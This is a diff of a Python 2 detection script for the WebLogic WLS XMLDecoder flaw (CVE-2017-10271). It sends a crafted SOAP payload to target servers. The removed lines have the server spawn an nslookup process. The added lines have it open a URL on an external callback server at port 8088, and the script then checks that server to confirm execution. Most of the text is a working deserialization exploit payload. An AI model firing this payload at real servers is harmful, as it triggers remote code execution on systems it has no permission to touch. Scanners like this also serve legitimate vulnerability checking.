@@ -47,42 +47,32 @@ def check(ip, port, timeout):
         }
 
     post_str = '''
-        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">  
-          <soapenv:Header> 
-            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">  
-              <java version="1.8" class="java.beans.XMLDecoder"> 
-                <void class="java.lang.ProcessBuilder"> 
-                  <array class="java.lang.String" length="3"> 
-                    <void index="0"> 
-                      <string>nslookup</string> 
-                    </void>  
-                    <void index="1"> 
-                      <string>%s</string> 
-                    </void> 
-                    <void index="2"> 
-                      <string>%s</string> 
-                    </void> 
-                  </array>  
-                  <void method="start"/>
-                </void> 
-              </java> 
-            </work:WorkContext> 
-          </soapenv:Header>  
-          <soapenv:Body/> 
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+          <soapenv:Header>
+            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+              <java version="1.8" class="java.beans.XMLDecoder">
+                <void class="java.net.URL">
+                  <string>http://%s:8088/add/%s</string>
+                  <void method="openStream"/>
+                </void>
+              </java>
+            </work:WorkContext>
+          </soapenv:Header>
+          <soapenv:Body/>
         </soapenv:Envelope>
-                ''' %(test_str, server_ip)
+                ''' % (server_ip, test_str)
     for url in check_url:
         target_url = 'http://'+ip+':'+str(port)+url.strip()
         req = urllib2.Request(url=target_url, headers=heads)
         if 'Web Services' in urllib2.urlopen(req, timeout=timeout).read():
                 req = urllib2.Request(url=target_url, data=post_str, headers=heads)
                 try:
-                    urllib2.urlopen(req, timeout=timeout).read()
+                    urllib2.urlopen(req, timeout=15).read()
                 except urllib2.URLError:
                     pass
                 sleep(2)
-                check_result = urllib2.urlopen("http://%s:8088/%s" %(server_ip, test_str), timeout=timeout).read()
+                check_result = urllib2.urlopen("http://%s:8088/check/%s" %(server_ip, test_str), timeout=timeout).read()
                 if "YES" in check_result:
-                    return "Exist CVE-2017-10271"
+                    return "存在WebLogic WLS远程执行漏洞(CVE-2017-10271)"
         else:
             pass
